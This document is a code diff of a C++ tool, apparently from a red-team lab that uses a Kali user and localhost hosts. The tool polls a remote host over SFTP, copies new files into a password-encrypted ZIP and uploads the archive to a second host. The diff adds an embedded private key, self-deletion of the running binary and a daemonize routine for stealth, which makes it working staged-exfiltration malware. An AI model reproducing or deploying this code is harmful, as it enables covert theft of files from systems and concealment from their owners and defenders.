@@ -1,34 +1,27 @@
-#include <iostream>
-#include <vector>
-#include <string>
+#include <fstream>
+#include <zip.h>
+#include <fcntl.h>
 #include <algorithm>
 #include <chrono>
 #include <thread>
-#include <libssh/libssh.h>
-#include <libssh/sftp.h>
-#include <zip.h>
-#include <fcntl.h>
-#include <fstream>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <semaphore.h>
+#include <csignal>
 #include <optional>
+#include <sstream>
+
+#include "file-transfer.h"
 
 using namespace std;
 using namespace std::chrono;
 
-const string REMOTE_HOST1 = "127.0.0.1";
-const string REMOTE_HOST2 = "127.0.0.1";
-const string REMOTE1_COLLECT_DIR = "/tmp/remote1/files/";
-const string REMOTE1_ARCHIVE_PATH = "/tmp/remote1/archive.zip";
-const string REMOTE2_DEST_PATH = "/tmp/remote2/transferred.zip";
-const string LOCAL_PRIVATE_KEY_PATH = "/home/kali/.ssh/id_rsa";
-const string ZIP_PASSPHRASE = "zip_archive_passphrase";
-const string LOCAL_PATH = "/tmp/local/";
-const string LOCAL_ZIP_PATH = "/tmp/local/local_zip.zip";
-const int CHECK_INTERVAL = 5;
+bool debug_mode = true;
+bool running = true;
+sem_t zip_semaphore;
 
-// Debug flag
-bool debug_mode = false;
-
-// Debug print function
 void debugprint(const string &message)
 {
     if (debug_mode)
@@ -37,22 +30,44 @@ void debugprint(const string &message)
     }
 }
 
+bool delete_self()
+{
+    // Open and unlink the running executable
+    char exe_path[1024];
+    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    if (len == -1)
+    {
+        cerr << "Error deleting self." << endl;
+        return false;
+    }
+
+    exe_path[len] = '\0';
+    if (!delete_local_file(string(exe_path)))
+    {
+        cerr << "Error deleting self." << endl;
+        return false;
+    }
+
+    return true;
+}
+
 ssh_session create_ssh_session(const string &host)
 {
     ssh_session session = ssh_new();
     if (session == NULL)
         return NULL;
 
+    // int verbosity = SSH_LOG_PROTOCOL;
+    // ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
     ssh_options_set(session, SSH_OPTIONS_USER, "kali");
     ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
-
-    // Load the private key
-    if (ssh_options_set(session, SSH_OPTIONS_IDENTITY, LOCAL_PRIVATE_KEY_PATH.c_str()) != SSH_OK)
+    if (ssh_options_set(session, SSH_OPTIONS_PUBLICKEY_ACCEPTED_TYPES, "ssh-rsa,rsa-sha2-256,rsa-sha2-512") != 0)
     {
-        cerr << "Error setting private key: " << ssh_get_error(session) << endl;
-        ssh_free(session);
-        return NULL;
+        cerr << "Error in setting ssh options: " << ssh_get_error(session) << endl;
     }
+
+    ssh_key private_key;
+    // ssh_key public_key;
 
     if (ssh_connect(session) != SSH_OK)
     {
@@ -61,15 +76,25 @@ ssh_session create_ssh_session(const string &host)
         return NULL;
     }
 
-    // Check authentication
-    if (ssh_userauth_publickey_auto(session, NULL, NULL) != SSH_AUTH_SUCCESS)
+    if (ssh_pki_import_privkey_base64(PRIVATE_KEY.c_str(), nullptr, nullptr, nullptr, &private_key) != SSH_OK)
+    {
+        cerr << "Error importing private key: " << ssh_get_error(session) << endl;
+        ssh_free(session);
+        return NULL;
+    }
+
+    if (ssh_userauth_publickey(session, nullptr, private_key) != SSH_AUTH_SUCCESS)
     {
         cerr << "Error authenticating with public key: " << ssh_get_error(session) << endl;
+        ssh_key_free(private_key);
+        // ssh_key_free(public_key);
         ssh_disconnect(session);
         ssh_free(session);
         return NULL;
     }
 
+    ssh_key_free(private_key);
+    // ssh_key_free(public_key);
     return session;
 }
 
@@ -106,47 +131,22 @@ bool list_new_files(sftp_session sftp, const string &path, time_t last_run, vect
     {
         if (attributes->type == SSH_FILEXFER_TYPE_REGULAR && attributes->mtime > last_run)
         {
-            new_files.push_back(REMOTE1_COLLECT_DIR + attributes->name);
+            string full_path = REMOTE1_COLLECT_DIR + attributes->name;
+
+            if (!file_exists_in_zip(LOCAL_ZIP_PATH, attributes->name))
+            {
+                new_files.push_back(full_path);
+            }
+            else
+            {
+                debugprint("File already exists in ZIP: " + string(attributes->name));
+            }
         }
         sftp_attributes_free(attributes);
     }
 
     sftp_closedir(dir);
-
     return !new_files.empty();
-}
-
-bool create_zip_from_files(const vector<string> &files, const string &zip_path, const string &password)
-{
-    int error;
-    zip_t *archive = zip_open(zip_path.c_str(), ZIP_CREATE, &error);
-    if (!archive)
-    {
-        cerr << "Error creating ZIP archive: " << zip_strerror(archive) << endl;
-        return false;
-    }
-
-    for (const auto &file : files)
-    {
-        zip_source_t *source = zip_source_file(archive, file.c_str(), 0, 0);
-        if (source == NULL)
-        {
-            cerr << "Error adding file to ZIP archive: " << zip_strerror(archive) << endl;
-            zip_close(archive);
-            return false;
-        }
-        string filename = file.substr(file.find_last_of("/") + 1);
-        zip_file_add(archive, filename.c_str(), source, ZIP_FL_ENC_UTF_8);
-        zip_file_set_encryption(archive, zip_name_locate(archive, filename.c_str(), ZIP_FL_ENC_UTF_8), ZIP_EM_AES_256, password.c_str());
-    }
-
-    if (zip_close(archive) < 0)
-    {
-        std::cerr << "Error closing ZIP archive: " << zip_strerror(archive) << std::endl;
-        return false;
-    }
-
-    return true;
 }
 
 optional<vector<string>> check_for_new_files(sftp_session sftp, time_t last_run)
@@ -173,7 +173,7 @@ optional<vector<string>> check_for_new_files(sftp_session sftp, time_t last_run)
     return new_files;
 }
 
-bool download_file(sftp_session sftp, const string &remote_file, const string &local_file)
+bool download_file(sftp_session sftp, const string &remote_file, pair<string, string> &file_contents)
 {
     sftp_file file = sftp_open(sftp, remote_file.c_str(), O_RDONLY, 0);
     if (file == NULL)
@@ -181,20 +181,25 @@ bool download_file(sftp_session sftp, const string &remote_file, const string &l
         cerr << "Failed to open file on RemoteHost1: " << remote_file << endl;
         return false;
     }
-    ofstream ofs(local_file, ios::binary);
-    if (!ofs.is_open())
-        return false;
 
-    char buffer[1024];
+    stringstream buffer;
+    char temp_buffer[1024];
     int nbytes;
-    while ((nbytes = sftp_read(file, buffer, sizeof(buffer))) > 0)
+    while ((nbytes = sftp_read(file, temp_buffer, sizeof(temp_buffer))) > 0)
     {
-        ofs.write(buffer, nbytes);
+        buffer.write(temp_buffer, nbytes);
+    }
+
+    if (nbytes < 0)
+    {
+        cerr << "Failed to read file: " << remote_file << endl;
+        sftp_close(file);
+        return false;
     }
 
     sftp_close(file);
-    ofs.close();
-
+    file_contents.first = remote_file.substr(remote_file.find_last_of('/') + 1);
+    file_contents.second = buffer.str();
     return true;
 }
 
@@ -202,20 +207,119 @@ bool download_files(sftp_session sftp, const vector<string> &remote_files, const
 {
     for (const auto &remote_file : remote_files)
     {
-        debugprint("Downloading remote file: " + remote_file);
-        string local_file = local_dir + remote_file.substr(remote_file.find_last_of('/') + 1);
-        if (!download_file(sftp, remote_file, local_file))
+        sftp_file file = sftp_open(sftp, remote_file.c_str(), O_RDONLY, 0);
+        if (file == NULL)
         {
-            cerr << "Failed to download file: " << remote_file << endl;
+            cerr << "Failed to open file on RemoteHost1: " << remote_file << endl;
             return false;
         }
+
+        ofstream ofs(local_dir + remote_file.substr(remote_file.find_last_of('/') + 1), ios::binary);
+        if (!ofs.is_open())
+        {
+            sftp_close(file);
+            return false;
+        }
+
+        char buffer[1024];
+        int nbytes;
+        while ((nbytes = sftp_read(file, buffer, sizeof(buffer))) > 0)
+        {
+            ofs.write(buffer, nbytes);
+        }
+
+        sftp_close(file);
+        ofs.close();
     }
     return true;
 }
 
-bool delete_remote_file(sftp_session sftp, const string &remote_file)
+bool create_zip_from_files(vector<string> &files, const string &local_dir, const string &zip_path, const string &password)
 {
-    return sftp_unlink(sftp, remote_file.c_str()) == SSH_OK;
+    sem_wait(&zip_semaphore);
+    int error;
+    zip_t *archive = zip_open(zip_path.c_str(), ZIP_CREATE, &error);
+    if (!archive)
+    {
+        cerr << "Error creating ZIP archive: " << zip_strerror(archive) << endl;
+        sem_post(&zip_semaphore);
+        return false;
+    }
+
+    for (const auto &file : files)
+    {
+        zip_source_t *source = zip_source_file(archive, file.c_str(), 0, 0);
+        if (source == NULL)
+        {
+            cerr << "Error adding file to ZIP archive: " << zip_strerror(archive) << endl;
+            zip_close(archive);
+            sem_post(&zip_semaphore);
+            return false;
+        }
+        string filename = file.substr(file.find_last_of("/") + 1);
+        zip_file_add(archive, filename.c_str(), source, ZIP_FL_ENC_UTF_8);
+        zip_file_set_encryption(archive, zip_name_locate(archive, filename.c_str(), ZIP_FL_ENC_UTF_8), ZIP_EM_AES_256, password.c_str());
+
+        string filepath = local_dir + filename;
+        debugprint("Deleting local file: " + filepath);
+        delete_local_file(filepath);
+    }
+
+    if (zip_close(archive) < 0)
+    {
+        cerr << "Error closing ZIP archive: " << zip_strerror(archive) << endl;
+        sem_post(&zip_semaphore);
+        return false;
+    }
+    sem_post(&zip_semaphore);
+    return true;
+}
+
+bool file_exists_in_zip(const string &zip_path, const string &filename)
+{
+    int err;
+    zip_t *archive = zip_open(zip_path.c_str(), 0, &err);
+    if (!archive)
+    {
+        return false;
+    }
+    zip_int64_t index = zip_name_locate(archive, filename.c_str(), 0);
+    zip_close(archive);
+    return index >= 0;
+}
+
+bool append_to_zip(const string &file_name, const string &content, const string &zip_path, const string &password)
+{
+    sem_wait(&zip_semaphore);
+    int error;
+    zip_t *archive = zip_open(zip_path.c_str(), ZIP_CREATE, &error);
+    if (!archive)
+    {
+        cerr << "Error creating ZIP archive: " << zip_strerror(archive) << endl;
+        sem_post(&zip_semaphore);
+        return false;
+    }
+
+    zip_source_t *source = zip_source_buffer(archive, content.data(), content.size(), 0);
+    if (source == NULL)
+    {
+        cerr << "Error creating ZIP source: " << zip_strerror(archive) << endl;
+        zip_close(archive);
+        sem_post(&zip_semaphore);
+        return false;
+    }
+
+    zip_file_add(archive, file_name.c_str(), source, ZIP_FL_ENC_UTF_8);
+    zip_file_set_encryption(archive, zip_name_locate(archive, file_name.c_str(), ZIP_FL_ENC_UTF_8), ZIP_EM_AES_256, password.c_str());
+
+    if (zip_close(archive) < 0)
+    {
+        cerr << "Error closing ZIP archive: " << zip_strerror(archive) << endl;
+        sem_post(&zip_semaphore);
+        return false;
+    }
+    sem_post(&zip_semaphore);
+    return true;
 }
 
 bool delete_local_file(const string &local_file)
@@ -223,12 +327,27 @@ bool delete_local_file(const string &local_file)
     return unlink(local_file.c_str()) == 0;
 }
 
+size_t get_file_size(string filename)
+{
+    struct stat stat_buf;
+    int rc = stat(filename.c_str(), &stat_buf);
+    return rc == 0 ? stat_buf.st_size : 0;
+}
+
+bool check_file_exists(string filename)
+{
+    struct stat stat_buf;
+    return (stat(filename.c_str(), &stat_buf) == 0);
+}
+
 bool upload_file(sftp_session sftp, const string &local_file, const string &remote_file)
 {
+    sem_wait(&zip_semaphore);
     ifstream file(local_file, ios::binary);
     if (!file)
     {
         cerr << "Error opening local file: " << local_file << endl;
+        sem_post(&zip_semaphore);
         return false;
     }
 
@@ -236,6 +355,7 @@ bool upload_file(sftp_session sftp, const string &local_file, const string &remo
     if (!sftp_file)
     {
         cerr << "Error opening remote file: " << ssh_get_error(sftp) << endl;
+        sem_post(&zip_semaphore);
         return false;
     }
 
@@ -246,149 +366,206 @@ bool upload_file(sftp_session sftp, const string &local_file, const string &remo
         {
             cerr << "Error writing to remote file: " << ssh_get_error(sftp) << endl;
             sftp_close(sftp_file);
+            sem_post(&zip_semaphore);
             return false;
         }
     }
 
     sftp_close(sftp_file);
+    sem_post(&zip_semaphore);
     return true;
 }
 
-int main(int argc, char **argv)
+void signal_handler(int signum)
 {
-    // Check for debug flag
-    if (argc > 1 && std::string(argv[1]) == "--debug")
+    running = false;
+}
+
+void daemonize()
+{
+    pid_t pid = fork();
+
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    if (setsid() < 0)
+        exit(EXIT_FAILURE);
+
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
+    pid = fork();
+
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    umask(0);
+
+    chdir("/");
+
+    for (long x = sysconf(_SC_OPEN_MAX); x >= 0; x--)
     {
-        debug_mode = true;
+        close(x);
+    }
+}
+
+void download_routine(const string &host)
+{
+    ssh_session session = create_ssh_session(host);
+    if (session == NULL)
+    {
+        cerr << "Failed to create SSH session to " << host << endl;
+        return;
     }
 
-    debugprint("Starting file transfers.");
-    // Get the current time at the start of the binary
-    time_t current_time = std::time(NULL);
-    char buffer[80];
-    strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", localtime(&current_time));
-
-    debugprint("Current time: " + string(buffer));
-    // Initialize last_run with the start time of the binary
-    time_t last_run = current_time;
-
-    // Create SSH and SFTP sessions for RemoteHost1
-    ssh_session ssh_session1 = create_ssh_session(REMOTE_HOST1);
-    if (ssh_session1 == NULL)
+    sftp_session sftp = create_sftp_session(session);
+    if (sftp == NULL)
     {
-        std::cerr << "Failed to create SSH session for RemoteHost1" << std::endl;
-        return 1;
+        cerr << "Failed to create SFTP session to " << host << endl;
+        ssh_disconnect(session);
+        ssh_free(session);
+        return;
     }
 
-    sftp_session sftp_session1 = create_sftp_session(ssh_session1);
-    if (sftp_session1 == NULL)
-    {
-        std::cerr << "Failed to create SFTP session for RemoteHost1" << std::endl;
-        ssh_disconnect(ssh_session1);
-        ssh_free(ssh_session1);
-        return 1;
-    }
+    // List of filepaths on remote target that have yet to be downloaded
+    vector<string> file_history;
+    // Contains filename and file contents
+    pair<string, string> file_contents;
 
-    // Create SSH and SFTP Sessions for RemoteHost2
-    ssh_session ssh_session2 = create_ssh_session(REMOTE_HOST2);
-    if (ssh_session2 == NULL)
-    {
-        std::cerr << "Failed to create SSH session for RemoteHost2" << std::endl;
-        sftp_free(sftp_session1);
-        ssh_disconnect(ssh_session1);
-        ssh_free(ssh_session1);
-        return 1;
-    }
+    // initialize time for run
+    time_t last_run = system_clock::to_time_t(system_clock::now());
 
-    sftp_session sftp_session2 = create_sftp_session(ssh_session2);
-    if (sftp_session2 == NULL)
+    while (running)
     {
-        std::cerr << "Failed to create SFTP session for RemoteHost1" << std::endl;
-        sftp_free(sftp_session1);
-        ssh_disconnect(ssh_session1);
-        ssh_free(ssh_session1);
-        ssh_disconnect(ssh_session2);
-        ssh_free(ssh_session2);
-        return 1;
-    }
-
-    while (true)
-    {
-        optional<vector<string>> new_files = check_for_new_files(sftp_session1, last_run);
+        auto now = system_clock::to_time_t(system_clock::now());
+        optional<vector<string>> new_files = check_for_new_files(sftp, last_run);
         if (new_files)
         {
-            if (download_files(sftp_session1, new_files.value(), LOCAL_PATH))
+            last_run = now;
+
+            for (const auto &file : new_files.value())
             {
-                // Create a list of local file paths
-                std::vector<std::string> local_files;
-                for (const auto &remote_file : new_files.value())
+                // Ensure file is not already in history. This can happen with very frequent checks.
+                if (find(file_history.begin(), file_history.end(), file) == file_history.end())
                 {
-                    local_files.push_back(LOCAL_PATH + remote_file.substr(remote_file.find_last_of('/') + 1));
+                    file_history.push_back(file);
                 }
+            }
 
-                // Create a zip file locally
-                if (create_zip_from_files(local_files, LOCAL_ZIP_PATH, ZIP_PASSPHRASE))
+            if (!file_history.empty())
+            {
+                vector<string> files_to_remove;
+                for (const auto &file : file_history)
                 {
-
-                    if (upload_file(sftp_session2, LOCAL_ZIP_PATH, REMOTE2_DEST_PATH))
+                    if (get_file_size(LOCAL_ZIP_PATH) > MAX_ZIP_SIZE)
                     {
-                        debugprint("Transferred archive to RemoteHost2.");
+                        cerr << "ZIP file exceeds threshold. Waiting until deleted." << endl;
+                        break;
+                    }
 
-                        // Delete the archive from LocalHost
-                        // if (delete_local_file(LOCAL_ZIP_PATH))
-                        // {
-                        //     debugprint("Deleted local archive file.");
-                        // }
-                        // else
-                        // {
-                        //     cerr << "Failed to delete local archive file." << endl;
-                        // }
+                    debugprint("Downloading file: " + file);
+                    if (!download_file(sftp, file, file_contents))
+                    {
+                        cerr << "Failed to download new file from " << host << endl;
+                        break;
+                    }
+
+                    if (append_to_zip(file_contents.first, file_contents.second, LOCAL_ZIP_PATH, ZIP_PASSPHRASE))
+                    {
+                        cout << "Successfully added file ZIP archive." << endl;
+                        // mark file for removal from history
+                        files_to_remove.push_back(file);
                     }
                     else
                     {
-                        cerr << "Failed to upload archive to RemoteHost2." << endl;
-                    }
-                    // Delete the unzipped files locally
-                    for (const auto &local_file : local_files)
-                    {
-                        if (delete_local_file(local_file))
-                        {
-                            debugprint("Deleted local file: " + local_file);
-                        }
-                        else
-                        {
-                            cerr << "Failed to delete local file: " + local_file << endl;
-                        }
+                        cerr << "Failed to create ZIP archive." << endl;
+                        break;
                     }
                 }
-                else
+
+                // Remove processed files from file_history
+                for (const auto &file : files_to_remove)
                 {
-                    cerr << "Failed to create zip file on local host." << endl;
+                    file_history.erase(remove(file_history.begin(), file_history.end(), file), file_history.end());
                 }
+            }
+        }
+
+        this_thread::sleep_for(seconds(CHECK_INTERVAL));
+    }
+
+    running = false;
+
+    sftp_free(sftp);
+    ssh_disconnect(session);
+    ssh_free(session);
+}
+
+void upload_routine(const string &host, const string &remote_path)
+{
+    ssh_session session = create_ssh_session(host);
+    if (session == NULL)
+    {
+        cerr << "Failed to create SSH session to " << host << endl;
+        return;
+    }
+
+    sftp_session sftp = create_sftp_session(session);
+    if (sftp == NULL)
+    {
+        cerr << "Failed to create SFTP session to " << host << endl;
+        ssh_disconnect(session);
+        ssh_free(session);
+        return;
+    }
+
+    while (running)
+    {
+        if (check_file_exists(LOCAL_ZIP_PATH) && get_file_size(LOCAL_ZIP_PATH) <= MAX_ZIP_SIZE)
+        {
+            if (upload_file(sftp, LOCAL_ZIP_PATH, remote_path))
+            {
+                cout << "Successfully uploaded ZIP archive to " << host << endl;
+                delete_local_file(LOCAL_ZIP_PATH);
             }
             else
             {
-                cerr << "Failed to download file(s) from RemoteHost1." << endl;
+                cerr << "Failed to upload ZIP archive to " << host << endl;
+                break;
             }
         }
-        else
-        {
-            debugprint("No new files found on RemoteHost1.");
-        }
 
-        // Update last_run to current time
-        last_run = time(NULL);
-        this_thread::sleep_for(chrono::seconds(CHECK_INTERVAL));
+        this_thread::sleep_for(seconds(20));
     }
+    running = false;
 
-    // Clean up sessions
-    sftp_free(sftp_session2);
-    ssh_disconnect(ssh_session2);
-    ssh_free(ssh_session2);
+    sftp_free(sftp);
+    ssh_disconnect(session);
+    ssh_free(session);
+}
 
-    sftp_free(sftp_session1);
-    ssh_disconnect(ssh_session1);
-    ssh_free(ssh_session1);
+int main()
+{
+    signal(SIGINT, signal_handler);
+
+    sem_init(&zip_semaphore, 0, 1);
+    if (DELETE_ON_EXEC)
+        delete_self();
+
+    // daemonize();
+    thread download_thread(download_routine, REMOTE_HOST1);
+    thread upload_thread(upload_routine, REMOTE_HOST2, REMOTE2_DEST_PATH);
+
+    download_thread.join();
+    upload_thread.join();
+
+    sem_destroy(&zip_semaphore);
 
     return 0;
 }
